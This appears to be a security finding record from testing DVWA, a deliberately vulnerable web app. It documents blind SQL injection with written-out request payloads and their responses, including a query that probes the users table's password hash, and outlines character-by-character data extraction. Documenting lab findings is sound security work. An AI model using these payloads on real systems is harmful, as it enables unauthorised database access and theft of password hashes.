title: SQL Injection (Blind) - Boolean-based blind injection
proof: GET /vulnerabilities/sqli_blind/?id=1'+AND+1=1--+-&Submit=Submit returned 'User ID exists in the database.' GET /vulnerabilities/sqli_blind/?id=1'+AND+1=2--+-&Submit=Submit returned 'User ID is MISSING from the database.' Boolean-based blind confirmed. Verified password hash length: AND LENGTH((SELECT password FROM users WHERE user_id=1))=32 returns 'exists'.
poc_steps: Extract data character by character using AND SUBSTRING(...) comparisons
